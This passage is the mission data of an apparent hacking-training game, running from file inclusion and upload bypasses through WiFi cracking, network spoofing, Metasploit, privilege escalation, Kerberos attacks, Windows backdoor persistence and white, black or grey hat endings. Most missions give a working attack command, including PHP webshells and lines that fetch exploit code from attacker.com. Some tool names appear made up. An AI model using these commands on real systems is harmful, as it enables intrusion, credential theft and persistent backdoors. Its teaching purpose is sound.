        reward: 1020, requiredLevel: 46, act: 3, chapter: 10, path: 'all'
    },
    {
        id: 47, name: 'PHP Wrapper LFI', description: 'LFI with PHP wrappers.',
        story: 'Read PHP source code using PHP filters.',
        target: 'http://site.2077/index.php', 
        command: 'php://filter/convert.base64-encode/resource=index.php',
        hint1: 'php://filter', hint2: 'base64-encode',
        explanation: 'PHP wrappers can read source code.',
        output: 'Base64 encoded source code.',
        darkKnowledge: 'Decode to find credentials, database passwords.',
        reward: 1040, requiredLevel: 47, act: 3, chapter: 10, path: 'all'
    },
    {
        id: 48, name: 'LFI to RCE', description: 'Turn LFI into code execution.',
        story: 'Apache logs contain user-agent. Inject PHP code.',
        target: 'http://site.2077/index.php', 
        command: '<?php system($_GET["cmd"]); ?>',
        hint1: 'Inject into User-Agent', hint2: 'Then include log file',
        explanation: 'Log poisoning gives RCE.',
        output: 'User-Agent injected. Include /var/log/apache2/access.log?cmd=id',
        darkKnowledge: 'Also try /proc/self/environ, /var/log/auth.log, /var/mail/root.',
        reward: 1060, requiredLevel: 48, act: 3, chapter: 10, path: 'all'
    },
    {
        id: 49, name: 'RFI Discovery', description: 'Remote file inclusion.',
        story: 'Page includes remote files? Test with http://',
        target: 'http://site.2077/index.php', 
        command: 'http://attacker.com/shell.txt',
        hint1: 'Remote URL', hint2: 'allow_url_include must be on',
        explanation: 'RFI executes remote code.',
        output: 'Remote file executed!',
        darkKnowledge: 'RFI is rare now but devastating when found.',
        reward: 1080, requiredLevel: 49, act: 3, chapter: 10, path: 'all'
    },
    {
        id: 50, name: 'File Inclusion Bypass', description: 'Bypass filters.',
        story: 'They block ../. Try double encoding.',
        target: 'http://site.2077/index.php', 
        command: '..%252f..%252f..%252fetc%252fpasswd',
        hint1: 'Double URL encode %2f', hint2: '%25 is % sign',
        explanation: 'Double encoding bypasses simple filters.',
        output: 'root:x:0:0:root:/root:/bin/bash',
        darkKnowledge: 'Also try ..;/ (Windows), ..\\ (Windows), ....// (bypass).',
        reward: 1100, requiredLevel: 50, act: 3, chapter: 10, path: 'all'
    },
    
    // CHAPTER 11: File Upload Attacks (51-55)
    {
        id: 51, name: 'File Upload Basics', description: 'Upload a webshell.',
        story: 'Profile picture upload at http://site.2077/upload. Upload PHP shell.',
        target: 'http://site.2077/upload', 
        command: '<?php system($_GET["cmd"]); ?>',
        hint1: 'Create PHP file', hint2: 'system() executes commands',
        explanation: 'PHP webshell gives command execution.',
        output: 'File uploaded: shell.php',
        darkKnowledge: 'Name it shell.php.jpg, shell.php;.jpg, shell.php%00.jpg to bypass.',
        reward: 1120, requiredLevel: 51, act: 3, chapter: 11, path: 'all'
    },
    {
        id: 52, name: 'Magic Byte Bypass', description: 'Bypass image validation.',
        story: 'They check file signatures. Add GIF magic bytes.',
        target: 'http://site.2077/upload', 
        command: 'GIF89a; <?php system($_GET["cmd"]); ?>',
        hint1: 'GIF89a is magic bytes', hint2: 'Add at start of file',
        explanation: 'Magic bytes fool image validators.',
        output: 'Upload accepted as GIF.',
        darkKnowledge: 'JPEG: ÿØÿà JFIF, PNG: ‰PNG, also try double extensions.',
        reward: 1140, requiredLevel: 52, act: 3, chapter: 11, path: 'all'
    },
    {
        id: 53, name: 'MIME Type Bypass', description: 'Bypass MIME checks.',
        story: 'They check Content-Type. Change to image/jpeg.',
        target: 'http://site.2077/upload', 
        command: 'curl -F "file=@shell.php;type=image/jpeg" http://site.2077/upload',
        hint1: 'Use curl', hint2: 'Set Content-Type',
        explanation: 'MIME type can be spoofed.',
        output: 'Upload accepted as image.',
        darkKnowledge: 'Burp Suite can intercept and modify MIME types.',
        reward: 1160, requiredLevel: 53, act: 3, chapter: 11, path: 'all'
    },
    {
        id: 54, name: 'Extension Bypass', description: 'Bypass extension filters.',
        story: 'They block .php. Try .php5, .phtml, .php7.',
        target: 'http://site.2077/upload', 
        command: 'shell.phtml',
        hint1: 'Try alternative PHP extensions', hint2: '.phtml, .php5, .phar',
        explanation: 'Many extensions execute PHP.',
        output: 'shell.phtml uploaded and executed.',
        darkKnowledge: 'Also try .htaccess with AddType application/x-httpd-php .jpg',
        reward: 1180, requiredLevel: 54, act: 3, chapter: 11, path: 'all'
    },
    {
        id: 55, name: 'ImageTragick Exploit', description: 'Exploit ImageMagick.',
        story: 'Site uses ImageMagick. Upload malicious image.',
        target: 'http://site.2077/upload', 
        command: 'push graphic-context\nviewbox 0 0 640 480\nfill \'url(https://attacker.com/shell.php?cmd=id)\'\npop graphic-context',
        hint1: 'ImageTragick vulnerability', hint2: 'URL in fill parameter',
        explanation: 'ImageMagick executes code in URLs.',
        output: 'Command output: uid=33(www-data)',
        darkKnowledge: 'CVE-2016-3714 - still found in legacy systems.',
        reward: 1200, requiredLevel: 55, act: 3, chapter: 11, path: 'all'
    },
    
    // CHAPTER 12: Wireless Attacks (56-60)
    {
        id: 56, name: 'WiFi Scanning', description: 'Discover wireless networks.',
        story: 'Outside target building. Scan for WiFi.',
        target: 'air', 
        command: 'airodump-ng wlan0',
        hint1: 'airodump-ng', hint2: 'Interface wlan0',
        explanation: 'WiFi scanning finds networks.',
        output: 'BSSID: AA:BB:CC:DD:EE:FF, ESSID: Corporate_Net, CH:6, ENC:WPA2',
        darkKnowledge: 'Use -c to focus on channel, -w to save output.',
        reward: 1220, requiredLevel: 56, act: 3, chapter: 12, path: 'all'
    },
    {
        id: 57, name: 'WPA2 Handshake Capture', description: 'Capture 4-way handshake.',
        story: 'Network uses WPA2. Capture handshake for cracking.',
        target: 'AA:BB:CC:DD:EE:FF', 
        command: 'airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0',
        hint1: '--bssid for target', hint2: '-w saves capture',
        explanation: 'Handshake needed for WPA2 cracking.',
        output: 'Handshake captured! capture-01.cap',
        darkKnowledge: 'Use aireplay-ng -0 5 to deauth clients and force reconnection.',
        reward: 1240, requiredLevel: 57, act: 3, chapter: 12, path: 'all'
    },
    {
        id: 58, name: 'WPA2 Cracking', description: 'Crack WPA2 handshake.',
        story: 'Now crack the handshake with rockyou.txt.',
        target: 'capture.cap', 
        command: 'aircrack-ng -w rockyou.txt capture.cap',
        hint1: 'aircrack-ng', hint2: '-w for wordlist',
        explanation: 'Dictionary attack on WPA2 handshake.',
        output: 'KEY FOUND! [ Summer2024 ]',
        darkKnowledge: 'Use hashcat -m 2500 for GPU acceleration.',
        reward: 1260, requiredLevel: 58, act: 3, chapter: 12, path: 'all'
    },
    {
        id: 59, name: 'Evil Twin Attack', description: 'Create rogue AP.',
        story: 'Set up fake Corporate_Net to steal credentials.',
        target: 'hostapd.conf', 
        command: 'hostapd hostapd.conf',
        hint1: 'hostapd creates AP', hint2: 'Configure in hostapd.conf',
        explanation: 'Evil twin tricks users into connecting.',
        output: 'Client connected. Credentials: admin:Summer2024',
        darkKnowledge: 'Use dhcpd to give IPs, dnsspoof to redirect traffic.',
        reward: 1280, requiredLevel: 59, act: 3, chapter: 12, path: 'all'
    },
    {
        id: 60, name: 'WPA3 Downgrade', description: 'Downgrade WPA3 to WPA2.',
        story: 'Target uses WPA3. Use Dragonblood attack.',
        target: 'wpa3_network', 
        command: 'wpa_sycamore',
        hint1: 'Dragonblood attack', hint2: 'wpa_sycamore tool',
        explanation: 'WPA3 can be downgraded to WPA2.',
        output: 'Network downgraded to WPA2. Handshake captured.',
        darkKnowledge: 'CVE-2019-13377 - side-channel leaks in WPA3.',
        reward: 1300, requiredLevel: 60, act: 3, chapter: 12, path: 'all'
    },
    
    // CHAPTER 13: Network Attacks (61-65)
    {
        id: 61, name: 'ARP Spoofing', description: 'MITM with ARP spoofing.',
        story: 'Intercept traffic between victim and gateway.',
        target: '192.168.1.100', 
        command: 'arpspoof -i eth0 -t 192.168.1.100 192.168.1.1',
        hint1: 'arpspoof', hint2: '-t target gateway',
        explanation: 'ARP spoofing redirects traffic through you.',
        output: 'ARP replies sent. Traffic flowing through attacker.',
        darkKnowledge: 'Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward',
        reward: 1320, requiredLevel: 61, act: 3, chapter: 13, path: 'all'
    },
    {
        id: 62, name: 'DNS Spoofing', description: 'Redirect DNS queries.',
        story: 'Redirect google.com to your phishing page.',
        target: '192.168.1.100', 
        command: 'dnsspoof -i eth0 -f hosts.txt',
        hint1: 'dnsspoof', hint2: '-f hosts file',
        explanation: 'DNS spoofing sends fake DNS responses.',
        output: 'google.com resolves to attacker IP.',
        darkKnowledge: 'hosts.txt format: 192.168.1.50 google.com',
        reward: 1340, requiredLevel: 62, act: 3, chapter: 13, path: 'all'
    },
    {
        id: 63, name: 'DHCP Spoofing', description: 'Rogue DHCP server.',
        story: 'Become DHCP server, set gateway to attacker.',
        target: 'eth0', 
        command: 'dhcpstarv -i eth0',
        hint1: 'dhcpstarv', hint2: '-i interface',
        explanation: 'Rogue DHCP gives clients attacker as gateway.',
        output: 'DHCP ACK sent. Client using attacker gateway.',
        darkKnowledge: 'Also set DNS to attacker for traffic interception.',
        reward: 1360, requiredLevel: 63, act: 3, chapter: 13, path: 'all'
    },
    {
        id: 64, name: 'VLAN Hopping', description: 'Access other VLANs.',
        story: 'Switch configured with multiple VLANs. Hop to VLAN 30.',
        target: 'switch', 
        command: 'dtp-spoof',
        hint1: 'DTP spoofing', hint2: 'Become trunk',
        explanation: 'DTP spoofing makes switch think you\'re a trunk.',
        output: 'Trunk mode negotiated. Access to all VLANs.',
        darkKnowledge: 'Then set VLAN: set vlan 30',
        reward: 1380, requiredLevel: 64, act: 3, chapter: 13, path: 'all'
    },
    {
        id: 65, name: 'STP Attack', description: 'Become root bridge.',
        story: 'Take over Spanning Tree Protocol.',
        target: 'switch', 
        command: 'stp-attack',
        hint1: 'STP attack', hint2: 'Send BPDUs with higher priority',
        explanation: 'Becoming root bridge redirects traffic.',
        output: 'You are now root bridge.',
        darkKnowledge: 'Can cause network instability and MITM.',
        reward: 1400, requiredLevel: 65, act: 3, chapter: 13, path: 'all'
    },
    
    // ============================================
    // ACT IV: THE RECKONING (Missions 66-85)
    // ============================================
    
    // CHAPTER 14: Metasploit Basics (66-70)
    {
        id: 66, name: 'Metasploit Console', description: 'Start Metasploit.',
        story: 'Time to use Metasploit framework.',
        target: 'msfconsole', 
        command: 'msfconsole',
        hint1: 'msfconsole', hint2: 'Start Metasploit',
        explanation: 'Metasploit is exploitation framework.',
        output: 'metasploit v6.1.27\nmsf6 >',
        darkKnowledge: 'Use workspaces to organize: workspace -a pentest1',
        reward: 1420, requiredLevel: 66, act: 4, chapter: 14, path: 'all'
    },
    {
        id: 67, name: 'Search Exploits', description: 'Find exploits.',
        story: 'Target runs Apache 2.4.49. Find exploit.',
        target: 'apache 2.4.49', 
        command: 'searchsploit apache 2.4.49',
        hint1: 'searchsploit', hint2: 'Search exploit-db',
        explanation: 'searchsploit finds public exploits.',
        output: 'Apache 2.4.49 - Path Traversal | multiple/webapps/50383.py',
        darkKnowledge: 'CVE-2021-41773 - critical path traversal.',
        reward: 1440, requiredLevel: 67, act: 4, chapter: 14, path: 'all'
    },
    {
        id: 68, name: 'Payload Generation', description: 'Create payload with msfvenom.',
        story: 'Generate reverse shell payload for Linux.',
        target: '192.168.1.100', 
        command: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf',
        hint1: 'msfvenom', hint2: '-p payload, LHOST, LPORT',
        explanation: 'msfvenom creates custom payloads.',
        output: 'Payload size: 74 bytes\nSaved as: shell.elf',
        darkKnowledge: 'Use -e x64/xor for encoding, -i 5 for iterations.',
        reward: 1460, requiredLevel: 68, act: 4, chapter: 14, path: 'all'
    },
    {
        id: 69, name: 'Meterpreter Basics', description: 'Use Meterpreter shell.',
        story: 'Gain Meterpreter session on target.',
        target: 'exploit', 
        command: 'use exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.100\nset LPORT 4444\nexploit -j',
        hint1: 'multi/handler', hint2: 'Set payload, LHOST, LPORT',
        explanation: 'Handler listens for incoming connections.',
        output: 'Meterpreter session 1 opened',
        darkKnowledge: 'Meterpreter has built-in commands: sysinfo, getuid, hashdump.',
        reward: 1480, requiredLevel: 69, act: 4, chapter: 14, path: 'all'
    },
    {
        id: 70, name: 'Post Exploitation', description: 'Gather system info.',
        story: 'Inside target. Collect system information.',
        target: 'session 1', 
        command: 'sysinfo\ngetuid\nhashdump',
        hint1: 'sysinfo', hint2: 'getuid, hashdump',
        explanation: 'Meterpreter post-exploitation commands.',
        output: 'Computer: WIN-123\nOS: Windows 10\nUser: NT AUTHORITY\\SYSTEM',
        darkKnowledge: 'hashdump gets NTLM hashes for offline cracking.',
        reward: 1500, requiredLevel: 70, act: 4, chapter: 14, path: 'all'
    },
    
    // CHAPTER 15: Privilege Escalation (71-75)
    {
        id: 71, name: 'Linux PrivEsc - SUID', description: 'Find SUID binaries.',
        story: 'You have low-priv shell. Escalate to root.',
        target: 'target', 
        command: 'find / -perm -4000 2>/dev/null',
        hint1: 'Find SUID files', hint2: '-perm -4000',
        explanation: 'SUID binaries run with owner privileges.',
        output: '/usr/bin/pkexec\n/usr/bin/sudo',
        darkKnowledge: 'GTFOBins has SUID exploitation techniques.',
        reward: 1520, requiredLevel: 71, act: 4, chapter: 15, path: 'all'
    },
    {
        id: 72, name: 'CVE-2021-4034', description: 'Exploit polkit pkexec.',
        story: 'pkexec is vulnerable. Get root.',
        target: 'target', 
        command: 'wget http://attacker.com/cve-2021-4034.c\ngcc cve-2021-4034.c -o exploit\n./exploit',
        hint1: 'pkexec exploit', hint2: 'CVE-2021-4034',
        explanation: 'pkexec vulnerability gives root.',
        output: '# whoami\nroot',
        darkKnowledge: 'This is PwnKit - works on most Linux distros.',
        reward: 1540, requiredLevel: 72, act: 4, chapter: 15, path: 'all'
    },
    {
        id: 73, name: 'Windows UAC Bypass', description: 'Bypass UAC on Windows.',
        story: 'You have admin but UAC blocks. Bypass it.',
        target: 'windows', 
        command: 'bypassuac',
        hint1: 'UAC bypass', hint2: 'Use fodhelper.exe',
        explanation: 'UAC bypass gives elevated prompt.',
        output: 'Elevated shell opened.',
        darkKnowledge: 'Metasploit has bypassuac modules.',
        reward: 1560, requiredLevel: 73, act: 4, chapter: 15, path: 'all'
    },
    {
        id: 74, name: 'Token Stealing', description: 'Steal SYSTEM token.',
        story: 'Impersonate SYSTEM token with incognito.',
        target: 'meterpreter', 
        command: 'load incognito\nlist_tokens -u\nimpersonate_token "NT AUTHORITY\\SYSTEM"',
        hint1: 'incognito', hint2: 'list_tokens, impersonate_token',
        explanation: 'Token stealing gives SYSTEM privileges.',
        output: 'Successfully impersonated NT AUTHORITY\\SYSTEM',
        darkKnowledge: 'Delegation tokens are available, impersonation tokens are usable.',
        reward: 1580, requiredLevel: 74, act: 4, chapter: 15, path: 'all'
    },
    {
        id: 75, name: 'Dirty Pipe Exploit', description: 'Exploit CVE-2022-0847.',
        story: 'Linux kernel 5.8+ vulnerable to Dirty Pipe.',
        target: 'target', 
        command: 'wget http://attacker.com/dirtypipe.c\ngcc dirtypipe.c -o exploit\n./exploit /etc/passwd 1 root:root:0:0:root:/root:/bin/bash',
        hint1: 'Dirty Pipe', hint2: 'Overwrites files',
        explanation: 'Dirty Pipe overwrites read-only files.',
        output: '/etc/passwd modified. Now root.',
        darkKnowledge: 'Can overwrite any file, even read-only.',
        reward: 1600, requiredLevel: 75, act: 4, chapter: 15, path: 'all'
    },
    
    // CHAPTER 16: Lateral Movement (76-80)
    {
        id: 76, name: 'Pass-the-Hash', description: 'Use hash without cracking.',
        story: 'You have NTLM hash of admin. Move laterally.',
        target: '192.168.1.200', 
        command: 'psexec -hashes 00000000000000000000000000000000:abcdef1234567890abcdef1234567890 administrator@192.168.1.200',
        hint1: 'psexec with hashes', hint2: 'LM hash:NTLM hash',
        explanation: 'Pass-the-hash authenticates with hash.',
        output: 'Microsoft Windows [Version 10.0.19042.985]\nC:\\Windows\\system32>',
        darkKnowledge: 'Also works with wmiexec, smbexec from Impacket.',
        reward: 1620, requiredLevel: 76, act: 4, chapter: 16, path: 'all'
    },
    {
        id: 77, name: 'Overpass-the-Hash', description: 'Convert hash to Kerberos ticket.',
        story: 'Use NTLM hash to get Kerberos ticket.',
        target: 'domain.local', 
        command: 'sekurlsa::pth /user:administrator /domain:domain.local /ntlm:abcdef1234567890abcdef1234567890 /run:powershell.exe',
        hint1: 'mimikatz sekurlsa::pth', hint2: 'Creates Kerberos ticket',
        explanation: 'Overpass-the-hash gives Kerberos auth.',
        output: 'Process powershell.exe created with NTLM hash.',
        darkKnowledge: 'Then access network resources with Kerberos.',
        reward: 1640, requiredLevel: 77, act: 4, chapter: 16, path: 'all'
    },
    {
        id: 78, name: 'Golden Ticket', description: 'Create golden ticket.',
        story: 'You have KRBTGT hash. Create domain admin ticket.',
        target: 'domain.local', 
        command: 'kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:abcdef1234567890abcdef1234567890 /id:500 /ptt',
        hint1: 'kerberos::golden', hint2: 'Need KRBTGT hash',
        explanation: 'Golden ticket gives domain admin forever.',
        output: 'Golden ticket for administrator@domain.local successfully injected',
        darkKnowledge: 'Valid for 10 years by default. Use /endin to set lifetime.',
        reward: 1660, requiredLevel: 78, act: 4, chapter: 16, path: 'all'
    },
    {
        id: 79, name: 'Silver Ticket', description: 'Create silver ticket.',
        story: 'Access specific service without contacting DC.',
        target: 'dc.domain.local', 
        command: 'kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-123456789-123456789-123456789 /target:dc.domain.local /rc4:abcdef1234567890abcdef1234567890 /service:cifs /ptt',
        hint1: 'Silver ticket', hint2: 'Target specific service',
        explanation: 'Silver ticket gives access to specific service.',
        output: 'Silver ticket for cifs/dc.domain.local injected',
        darkKnowledge: 'Less detectable than golden ticket.',
        reward: 1680, requiredLevel: 79, act: 4, chapter: 16, path: 'all'
    },
    {
        id: 80, name: 'DCSync Attack', description: 'Sync domain controller.',
        story: 'Pull all domain hashes with DCSync.',
        target: 'dc.domain.local', 
        command: 'lsadump::dcsync /user:domain\\krbtgt',
        hint1: 'lsadump::dcsync', hint2: 'Needs DA privileges',
        explanation: 'DCSync mimics domain replication.',
        output: 'Hash NTLM: abcdef1234567890abcdef1234567890',
        darkKnowledge: 'Can also get hashes of any user with /user:username.',
        reward: 1700, requiredLevel: 80, act: 4, chapter: 16, path: 'all'
    },
    
    // CHAPTER 17: Persistence (81-85)
    {
        id: 81, name: 'Registry Persistence', description: 'Add to Run keys.',
        story: 'Make backdoor survive reboot.',
        target: 'windows', 
        command: 'reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\backdoor.exe"',
        hint1: 'reg add', hint2: 'Run key',
        explanation: 'Registry Run keys execute on boot.',
        output: 'The operation completed successfully.',
        darkKnowledge: 'HKCU for current user, HKLM for all users.',
        reward: 1720, requiredLevel: 81, act: 4, chapter: 17, path: 'all'
    },
    {
        id: 82, name: 'Service Persistence', description: 'Create Windows service.',
        story: 'Install as service running as SYSTEM.',
        target: 'windows', 
        command: 'sc create backdoor binPath= "C:\backdoor.exe" start= auto',
        hint1: 'sc create', hint2: 'binPath, start= auto',
        explanation: 'Services run at boot as SYSTEM.',
        output: '[SC] CreateService SUCCESS',
        darkKnowledge: 'Services can be named to blend in (e.g., UpdateService).',
        reward: 1740, requiredLevel: 82, act: 4, chapter: 17, path: 'all'
    },
    {
        id: 83, name: 'Scheduled Task Persistence', description: 'Create scheduled task.',
        story: 'Use task scheduler for persistence.',
        target: 'windows', 
        command: 'schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM',
        hint1: 'schtasks', hint2: '/sc onlogon',
        explanation: 'Scheduled tasks run at logon.',
        output: 'SUCCESS: The scheduled task "Backdoor" has been created.',
        darkKnowledge: 'Use /sc onidle, onstart, or onlogon.',
        reward: 1760, requiredLevel: 83, act: 4, chapter: 17, path: 'all'
    },
    {
        id: 84, name: 'WMI Persistence', description: 'WMI event subscription.',
        story: 'Stealthy persistence with WMI.',
        target: 'windows', 
        command: 'wmic /namespace:\\\root\subscription PATH __EventFilter CREATE Name="Backdoor", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"',
        hint1: 'WMI event filter', hint2: 'Then create consumer',
        explanation: 'WMI persistence is fileless and stealthy.',
        output: 'Instance created successfully.',
        darkKnowledge: 'Also create CommandLineEventConsumer to execute backdoor.',
        reward: 1780, requiredLevel: 84, act: 4, chapter: 17, path: 'all'
    },
    {
        id: 85, name: 'Startup Folder', description: 'Add to startup folder.',
        story: 'Simple persistence in startup folder.',
        target: 'windows', 
        command: 'copy backdoor.exe "C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"',
        hint1: 'Startup folder', hint2: 'AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
        explanation: 'Startup folder runs on user login.',
        output: '1 file(s) copied.',
        darkKnowledge: 'All Users: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp',
        reward: 1800, requiredLevel: 85, act: 4, chapter: 17, path: 'all'
    },
    
    // ============================================
    // ACT V: THE ENDING (Missions 86-100)
    // ============================================
    
    // CHAPTER 18: Reverse Engineering (86-90)
    {
        id: 86, name: 'Basic Assembly', description: 'Read assembly code.',
        story: 'Analyze malware sample with objdump.',
        target: 'malware.bin', 
        command: 'objdump -d malware.bin',
        hint1: 'objdump -d', hint2: 'Disassemble binary',
        explanation: 'Assembly shows program instructions.',
        output: 'push rbp\nmov rbp, rsp\nsub rsp, 0x10',
        darkKnowledge: 'x86-64 uses different registers than x86.',
        reward: 1820, requiredLevel: 86, act: 5, chapter: 18, path: 'all'
    },
    {
        id: 87, name: 'GDB Debugging', description: 'Debug with GDB.',
        story: 'Find buffer overflow in binary.',
        target: 'vuln', 
        command: 'gdb vuln',
        hint1: 'gdb', hint2: 'Set breakpoints',
        explanation: 'GDB allows dynamic analysis.',
        output: 'Breakpoint 1 at 0x40116c',
        darkKnowledge: 'Use pattern_create and pattern_offset to find offset.',
        reward: 1840, requiredLevel: 87, act: 5, chapter: 18, path: 'all'
    },
    {
        id: 88, name: 'Shellcode Analysis', description: 'Analyze shellcode.',
        story: 'Analyze shellcode with scdbg.',
        target: 'shellcode.bin', 
        command: 'scdbg -f shellcode.bin',
        hint1: 'scdbg', hint2: 'Simulate shellcode',
        explanation: 'scdbg simulates shellcode execution.',
        output: 'API calls: WinExec, ExitProcess',
        darkKnowledge: 'Shellcode must be position-independent and null-free.',
        reward: 1860, requiredLevel: 88, act: 5, chapter: 18, path: 'all'
    },
    {
        id: 89, name: 'Malware Unpacking', description: 'Unpack UPX packed malware.',
        story: 'Malware packed with UPX. Unpack it.',
        target: 'packed.exe', 
        command: 'upx -d packed.exe',
        hint1: 'upx -d', hint2: 'Decompress UPX',
        explanation: 'UPX unpacks compressed executables.',
        output: 'Unpacked 1 file.',
        darkKnowledge: 'Custom packers need manual unpacking with debugger.',
        reward: 1880, requiredLevel: 89, act: 5, chapter: 18, path: 'all'
    },
    {
        id: 90, name: 'API Hooking', description: 'Hook Windows API.',
        story: 'Use Frida to hook MessageBoxA.',
        target: 'target.exe', 
        command: 'frida -l hook.js target.exe',
        hint1: 'frida', hint2: 'JavaScript hooks',
        explanation: 'Frida hooks functions at runtime.',
        output: 'MessageBoxA called with text: "Hello"',
        darkKnowledge: 'hook.js: Interceptor.attach(Module.findExportByName("user32.dll", "MessageBoxA"), { onEnter: function(args) { console.log("MessageBox called"); } });',
        reward: 1900, requiredLevel: 90, act: 5, chapter: 18, path: 'all'
    },
    
    // CHAPTER 19: Bug Bounty (91-95)
    {
        id: 91, name: 'Reconnaissance', description: 'Recon for bug bounty.',
        story: 'Find subdomains of target.com.',
        target: 'target.com', 
        command: 'amass enum -d target.com',
        hint1: 'amass', hint2: 'Subdomain enumeration',
        explanation: 'Amass finds subdomains from multiple sources.',
        output: 'admin.target.com\ndev.target.com\nstaging.target.com',
        darkKnowledge: 'Also use subfinder, assetfinder, and crt.sh.',
        reward: 1920, requiredLevel: 91, act: 5, chapter: 19, path: 'all'
    },
    {
        id: 92, name: 'Parameter Discovery', description: 'Fuzz for parameters.',
        story: 'Find hidden parameters on target.',
        target: 'https://target.com/page.php', 
        command: 'ffuf -w wordlist.txt -u https://target.com/page.php?FUZZ=1',
        hint1: 'ffuf', hint2: 'FUZZ keyword',
        explanation: 'ffuf finds hidden parameters.',
        output: 'admin, debug, test, dev',
        darkKnowledge: 'Use -fc to filter by status code, -fs to filter by size.',
        reward: 1940, requiredLevel: 92, act: 5, chapter: 19, path: 'all'
    },
    {
        id: 93, name: 'Vulnerability Scanning', description: 'Scan with nuclei.',
        story: 'Use nuclei to find vulnerabilities.',
        target: 'https://target.com', 
        command: 'nuclei -u https://target.com',
        hint1: 'nuclei', hint2: 'Template-based scanner',
        explanation: 'nuclei checks for known vulnerabilities.',
        output: 'CVE-2021-41773 | Apache 2.4.49 Path Traversal',
        darkKnowledge: 'Write custom templates in YAML.',
        reward: 1960, requiredLevel: 93, act: 5, chapter: 19, path: 'all'
    },
    {
        id: 94, name: 'Report Writing', description: 'Write bug bounty report.',
        story: 'Document your findings for submission.',
        target: 'report.md', 
        command: 'echo "# Vulnerability Report\n\nCVE-2021-41773 Path Traversal in Apache 2.4.49\n\n## Steps to Reproduce\n1. Send GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd\n2. Observe response" > report.md',
        hint1: 'Markdown format', hint2: 'Include steps to reproduce',
        explanation: 'Good reports get bounties.',
        output: 'report.md created',
        darkKnowledge: 'Include impact, CVSS score, and remediation.',
        reward: 1980, requiredLevel: 94, act: 5, chapter: 19, path: 'all'
    },
    {
        id: 95, name: 'Responsible Disclosure', description: 'Disclose to vendor.',
        story: 'Email security@target.com with PGP.',
        target: 'security@target.com', 
        command: 'gpg --encrypt --recipient security@target.com report.md',
        hint1: 'gpg --encrypt', hint2: 'Use vendor\'s PGP key',
        explanation: 'Encrypt sensitive reports.',
        output: 'report.md.gpg created',
        darkKnowledge: '90-day disclosure policy is standard.',
        reward: 2000, requiredLevel: 95, act: 5, chapter: 19, path: 'all'
    },
    
    // CHAPTER 20: The Final Choice (96-100) - Path-specific endings
    {
        id: 96, name: 'The CISO Offer', description: 'Become security architect.',
        story: 'Fortune 500 offers you CISO position.',
        target: 'choice', 
        command: 'accept',
        hint1: 'Accept the offer', hint2: 'White hat ending',
        explanation: 'You become a leader in security.',
        output: 'You are now CISO. Your TED talk has 2M views.',
        darkKnowledge: 'White Hat ending 1/3',
        reward: 2100, requiredLevel: 96, act: 5, chapter: 20, path: 'white'
    },
    {
        id: 97, name: 'The Mentor', description: 'Start a security academy.',
        story: 'Teach next generation of hackers.',
        target: 'choice', 
        command: 'teach',
        hint1: 'Choose to teach', hint2: 'White hat ending',
        explanation: 'Your students become leaders.',
        output: 'Your academy has 1000 graduates.',
        darkKnowledge: 'White Hat ending 2/3',
        reward: 2120, requiredLevel: 97, act: 5, chapter: 20, path: 'white'
    },
    {
        id: 98, name: 'The Consultant', description: 'Start security firm.',
        story: 'Your own consulting company.',
        target: 'choice', 
        command: 'start firm',
        hint1: 'Start business', hint2: 'White hat ending',
        explanation: 'You help companies secure systems.',
        output: 'Your firm has 50 employees and 100 clients.',
        darkKnowledge: 'White Hat ending 3/3',
        reward: 2140, requiredLevel: 98, act: 5, chapter: 20, path: 'white'
    },
    
    {
        id: 96, name: 'The Kingpin', description: 'Build cybercrime empire.',
        story: '$10M offshore, 50 hackers work for you.',
        target: 'choice', 
        command: 'build empire',
        hint1: 'Expand operations', hint2: 'Black hat ending',
        explanation: 'You control the dark web.',
        output: 'Your empire spans 20 countries. Feds are after you.',
        darkKnowledge: 'Black Hat ending 1/3',
        reward: 2100, requiredLevel: 96, act: 5, chapter: 20, path: 'black'
    },
    {
        id: 97, name: 'The Ghost', description: 'Disappear completely.',
        story: 'Fake your death, live in shadows.',
        target: 'choice', 
        command: 'disappear',
        hint1: 'Vanish', hint2: 'Black hat ending',
        explanation: 'No one knows you exist.',
        output: 'You are a legend. Wanted posters everywhere.',
        darkKnowledge: 'Black Hat ending 2/3',
        reward: 2120, requiredLevel: 97, act: 5, chapter: 20, path: 'black'
    },
    {
        id: 98, name: 'The Prisoner', description: 'Get caught but write memoir.',
        story: 'Feds catch you. Write bestselling book.',
        target: 'choice', 
        command: 'write book',
        hint1: 'Tell your story', hint2: 'Black hat ending',
        explanation: 'Your book becomes a movie.',
        output: '10 years prison. Your book is #1 bestseller.',
        darkKnowledge: 'Black Hat ending 3/3',
        reward: 2140, requiredLevel: 98, act: 5, chapter: 20, path: 'black'
    },
    
    {
        id: 96, name: 'The Legend', description: 'Biggest leak in history.',
        story: 'Leak documents that change the world.',
        target: 'choice', 
        command: 'leak all',
        hint1: 'Release everything', hint2: 'Grey hat ending',
        explanation: 'Governments fall. You\'re a hero.',
        output: 'Your leak exposed 5 governments. You\'re on every news.',
        darkKnowledge: 'Grey Hat ending 1/3',
        reward: 2100, requiredLevel: 96, act: 5, chapter: 20, path: 'grey'
    },
    {
        id: 97, name: 'The Whistleblower', description: 'Testify before congress.',
        story: 'Become legal witness against corporations.',
        target: 'choice', 
        command: 'testify',
        hint1: 'Go public', hint2: 'Grey hat ending',
        explanation: 'You change laws but go to prison.',
        output: 'Prison for 5 years. Laws changed because of you.',
        darkKnowledge: 'Grey Hat ending 2/3',
        reward: 2120, requiredLevel: 97, act: 5, chapter: 20, path: 'grey'
    },
